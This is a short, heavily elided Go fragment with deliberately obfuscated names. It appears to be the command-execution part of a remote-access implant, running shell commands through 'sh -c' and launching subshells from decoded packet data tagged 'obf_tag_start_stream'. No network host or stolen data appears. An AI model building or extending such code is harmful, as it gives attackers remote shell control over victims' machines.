...
func obf_func_exec(obf_var_shell_command string) []byte {
	obf_var_stdout, obf_var_e := exec.Command("sh", "-c", obf_var_shell_command).Output()
	if obf_var_e != nil {
		...
		if !obf_stream.obf_var_lock {
			...
			if obf_var_res != "" {
				...
				if strings.HasPrefix(obf_var_dec_res, "obf_tag_start_stream") {
					...
					obf_var_subshell := exec.Command("sh", "-c", strings.Join(obf_var_split_packet[0:len(obf_var_split_packet) - 2], " "))
